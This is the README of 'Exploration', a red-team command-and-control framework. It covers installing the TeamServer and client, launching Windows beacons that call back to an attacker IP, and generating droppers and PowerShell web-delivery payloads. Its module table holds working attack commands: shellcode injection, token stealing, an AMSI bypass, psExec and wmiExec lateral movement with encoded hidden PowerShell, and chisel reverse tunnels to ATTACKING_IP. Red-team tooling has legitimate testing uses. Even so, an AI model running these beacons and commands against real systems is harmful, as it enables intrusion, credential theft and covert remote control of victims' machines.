# Exploration C2

<p align="center">
<img src="https://github.com/maxDcb/C2TeamServer/blob/master/images/Exploration1.png?raw=true" />
</p>

## What it is

Exploration is a rudimentary redteam Command and Control framework.  
This repository contains the TeamServer and the Client.  
The release includes the TeamServer the Client with preconfigured certificate as well as the beacons and modules for windows from [C2Implant](https://github.com/maxDcb/C2Implant).

```
wget -q $(wget -q -O - 'https://api.github.com/repos/maxDcb/C2TeamServer/releases/latest' | jq -r '.assets[] | select(.name=="Release.tar.gz").browser_download_url') -O ./C2TeamServer.tar.gz
mkdir C2TeamServer && tar xf C2TeamServer.tar.gz -C C2TeamServer --strip-components 1
```

## Introduction

The TeamServer is a stand alone application, coded in c++, that handle listeners. The client, coded in python, communicate with the TeamServer through GRPC.  
Beacons run on the victime host. Each Beacons which connects back to the TeamServer open a new session. This session is used to control the Beacon, send commands and receive results.  
Listener and Beacons can communicate through TCP, SMB, HTTP ,HTTPS and Github issues depending on the situation.

![alt text](https://github.com/maxDcb/C2TeamServer/blob/master/images/ListenersAndSessions.png?raw=true)

A compiled version of the TeamServer is ready to use in the Releases, with some default certificats for GRPC communication and HTTP Listener:

The TeamServer binary is in Release/TeamServer  
it's launched using 

```
cd Release/TeamServer  
./TeamServer
```

![alt text](https://github.com/maxDcb/C2TeamServer/blob/master/images/TeamServerLaunch.png?raw=true)

The Python Client is in Release/Client 
It's launched using 'python3 GUI.py'  

```
cd  Release/Client 
# --dev is to specify that the GRPC hostname in the SSL certificat will not be checked
# --ip is the ip of the TeamServer
python3 GUI.py --ip 127.0.0.0 --port 50051 --dev
```

## TeamServer Listeners

4 types of listeners are available from the TeamServer: HTTP, HTTPS that start a web server on the given port, TCP that start a TCP server on the given port and GitHub that use GitHub issues from a project like "maxDcb/C2TeamServer" and a personal access token (with issues write rights).

![alt text](https://github.com/maxDcb/C2TeamServer/blob/master/images/AddListener.png?raw=true)

![alt text](https://github.com/maxDcb/C2TeamServer/blob/master/images/AddListenerTypes.png?raw=true)

![alt text](https://github.com/maxDcb/C2TeamServer/blob/master/images/Listeners.png?raw=true)


## Beacons

### Delivery

Beacons can be deliver using the integrated methodes:  

![alt text](https://github.com/maxDcb/C2TeamServer/blob/master/images/GenerateDropper.png?raw=true)  

| Mehode           | Description      |
| :--------------- | :--------------- |
| Host             | Upload a file on the teamserver to be downloaded by a web request from a web listener (http/https). |
| Generate         | Mode available: <br>WindowsExecutable generate 2 droppers, an EXE and a DLL from the appropriate beacon link to the given listener. |
| GenerateAndHost  | Mode available: <br>PowershellWebDelivery generate a playload that is store on the teamserver to be downloaded by a web request from a web listener (http/https), and the oneliner in powershell to deliver the payload. |


### Windows Beacon

Winodws Beacons and command modules are compiled separately in another [project](https://github.com/maxDcb/C2Implant), but a compiled version is provided in ./Release/Beacons and ./Release/Modules to be able to use it directly.

![alt text](https://github.com/maxDcb/C2TeamServer/blob/master/images/ReleaseModulesBeacons.png?raw=true)

To launch a beacon available in ./Release/Beacons use the following syntax on a windows machine:  

```
.\BeaconHttp.exe IP_TEAMSERVER PORT_LISTENER http/https
.\BeaconHttp.exe 10.10.52.5 8443 https
.\BeaconHttp.exe 10.10.52.5 80 http
```

When the Beacon is started and connect to the TeamServer, a new session is started from where you can interact with the Beacon:

![alt text](https://github.com/maxDcb/C2TeamServer/blob/master/images/NewSession.png?raw=true)

![alt text](https://github.com/maxDcb/C2TeamServer/blob/master/images/SessionInteract.png?raw=true)

Windows beacon uses primarily windows API and start with no module loaded. Modules are loaded at runtime using "MemoryModule" project to load DLL sent by the TeamServer to the beacon.  

![alt text](https://github.com/maxDcb/C2TeamServer/blob/master/images/loadModule.png?raw=true)

| Modules          | Description      |
| :--------------- | :--------------- |
| loadModule       |Load module DLL file on the memory of the beacon, giving the beacon this capability.<br>Load the DLL from the given path, if it's not found try the default ../Modules/ path.exemple:<br> - loadModule /tools/PrintWorkingDirectory.dll|
| assemblyExec     |Execute shellcode in a process (notepad.exe), wait for the end of execution or a timeout (120 sec). Retrieve the output.<br>Use -r to use a shellcode file.<br>If -e or -d are given, use donut to create the shellcode.<br>exemple:<br>- assemblyExec -r ./shellcode.bin<br>- assemblyExec -e ./program.exe arg1 arg2...<br>- assemblyExec -e ./Seatbelt.exe -group=system<br>- assemblyExec -d ./test.dll method arg1 arg2...|
| upload           |Upload a file from the attacker machine to the victime machine<br>exemple:<br>- upload c:\temp\toto.exe c:\temp\toto.exe|
| download         |Download a file from victime machine to the attacker machine<br>exemple:<br>- download c:\temp\toto.exe c:\temp\toto.exe|
| run              |Run new process on the system.<br>If the cmd is a system cmd use the following syntax 'cmd /c command'.<br>The beacon wait for the cmd to end and provide the output.'<br>exemple:<br> - run whoami<br> - run cmd /c dir<br> - run .\Seatbelt.exe -group=system|
| script           | - |
| inject           |Inject shellcode in the pid process. For linux must be root or at least have ptrace capability.<br>No output is provided.<br>Use -r to use a shellcode file.<br>If -e or -d are given, use donut to create the shellcode.<br>If pid is negative a new process is created for the injection.<br>exemple:<br>- inject -r ./calc.bin 2568<br>- inject -e ./beacon.exe pid arg1 arg2<br>- inject -d ./calc.dll pid method arg1 arg2|
| pwd              |PrintWorkingDirectory|
| cd               |ChangeDirectory|
| ls               |ListDirectory|
| ps               |ListProcesses|
| makeToken        |Create a token from user and password and impersonate it. <br>exemple:<br>- makeToken DOMAIN\Username Password|
| rev2self         |Drop the impersonation of a token, created with makeToken<br>exemple:<br>- rev2self|
| stealToken       |Steal a token and impersonate the it. You must have administrator privilege. <br>exemple:<br>- stealToken pid|
| coffLoader       |Load a .o coff file and execute it.<br>Coff take packed argument as entry, you get to specify the type as a string of [Z,z,s,i] for wstring, string, short, int.<br>exemple:<br>- coffLoader ./dir.x64.o go Zs c:\ 0<br>- coffLoader ./whoami.x64.o|
| powershell       | Execute a powershell command.<br>To be sure to get the output of the commande do 'cmd | write-output'.<br>You can import module using -i, added as New-Module at every execution.<br>You run scripts using -s.<br>AMSI bypass by patching the amsi.dll will work once for all.<br>exemple:<br> - powershell whoami  |write-output<br> - powershell import-module PowerUpSQL.ps1; Get-SQLConnectionObject<br> - powershell -i /tmp/PowerUpSQL.ps1 <br> - powershell -s /tmp/script.ps1|
| kerberosUseTicket|Import a kerberos ticket from a file to the curent LUID. <br>exemple:<br>- KerberosUseTicket /tmp/ticket.kirbi<br>|
| psExec           |Create an exe on an SMB share of the victime and a service to launch this exec using system. <br>The exe must be a service binary or inject into another process. <br>You must have the right kerberos tickets. <br>exemple:<br>- psExec m3dc.cyber.local /tmp/implant.exe<br>- psExec 10.9.20.10 /tmp/implant.exe|
| wmiExec          |Execute a command through Windows Management Instrumentation (WMI). <br>The user have to be administrator of the remote machine. <br>Can be use with credentials or with kerberos authentication. <br>To use with kerberos, the ticket must be in memory (use Rubeus). <br>exemple:<br>- wmiExec -u DOMAIN\Username Password target powershell.exe -nop -w hidden -e SQBFAFgAIAAoACgAbgBlAHcALQBvAGIAagBlAGMAdAAgAE4AZQB0AC4AV<br>- wmiExec -k DOMAIN\dc target powershell.exe -nop -w hidden -e SQBFAFgAIAAoACgAbgBlAHcALQBvAGIAagBlAGMAdAAgAE4AZQB0AC4AV|
| spawnAs          |Launch a new process as another user, with the given credentials. <br>exemple:<br>- spawnAs DOMAIN\Username Password powershell.exe -nop -w hidden -e SQBFAFgAIAAoACgA...<br>- spawnAs .\Administrator Password C:\Users\Public\Documents\implant.exe|
| chisel           |Launch chisel in a thread on the remote server.<br>No output is provided.<br>exemple:<br>- chisel status<br>- chisel stop pid<br>Reverse Socks Proxy:<br>- chisel /tools/chisel.exe client ATTACKING_IP:LISTEN_PORT R:socks<br>- On the attacking machine: chisel server -p LISTEN_PORT --reverse<br>Remote Port Forward:<br>- chisel /tools/chisel.exe client ATTACKING_IP:LISTEN_PORT R:LOCAL_PORT:TARGET_IP:REMOT_PORT<br>- On the attacking machine: chisel server -p LISTEN_PORT --reverse|
| tree             |Tree|
| socks            |Start a socks5 server on the TeamServer and tunnel the traffic to the Beacon.<br>The tunneling is done using the communication protocol of the beacon.<br>Only one socks5 server can be opened at a time.<br>exemple:<br> - socks start 1080 <br> - socks stop|

AssemblyExec & Inject, that use Donut project, make it possible to launch binary EXE, DLL, managed or unmanaged direclty from memory on the remote host.

![alt text](https://github.com/maxDcb/C2TeamServer/blob/master/images/AssemblyExecMimikatz.png?raw=true)

Coff, that use COFFLoader project, is used to run Coff files.  

![alt text](https://github.com/maxDcb/C2TeamServer/blob/master/images/coffDir.png?raw=true)

Two side projects can be used to deliver the beacons:
* [PowershellWebDelivery](https://github.com/maxDcb/PowershellWebDelivery)
* [PeDropper](https://github.com/maxDcb/PeDropper)


### Linux Beacon

A very basic Linux Beacons coded in python can be found here: [C2ImplantPy](https://github.com/maxDcb/C2ImplantPy).

An other very basic Linux Beacons coded in Nim can be found here: [C2ImplantPy](https://github.com/maxDcb/C2ImplantNim).


## Build the TeamServer

### Sumbodule & External Projects:  

* [Donut](https://github.com/TheWover/donut): Creat shellcode from PE files.  
* [cpp-httplib](https://github.com/yhirose/cpp-httplib): Http and Https Listener.  
* [CoffLoader](https://github.com/trustedsec/COFFLoader): Run object files from [CS-Situational-Awareness-BOF](https://github.com/trustedsec/CS-Situational-Awareness-BOF).
* [MemoryModule](https://github.com/fancycode/MemoryModule): Load DLL at runtime.
* [UnmanagedPowerShell](https://github.com/leechristensen/UnmanagedPowerShell): Powershell for unmanaged code.
* [cpp-base64](https://github.com/ReneNyffenegger/cpp-base64): base64.
* [json](https://github.com/nlohmann/json): json parser.


### Build

```
sudo apt install gcc-mingw-w64
sudo apt install g++-mingw-w64
sudo apt install golang-cfssl
sudo apt install cmake 

pip3 install pycryptodome
pip install conan
pip install grpcio
pip install PyQt5
pip install pyqtdarktheme
pip install protobuf

conan profile detect

git clone https://github.com/maxDcb/C2TeamServer.git
cd C2TeamServer
git submodule update --init

mkdir build
cd build
cmake ..
make -j4
```

The TeamServer binary is in ./Release/TeamServer  
it's launched using './TeamServer'  

The Python Client is in ./Release/Client  
It's launched using 'python3 GUI.py'  

![alt text](https://github.com/maxDcb/C2TeamServer/blob/master/images/ReleaseTeamServerClient.png?raw=true)

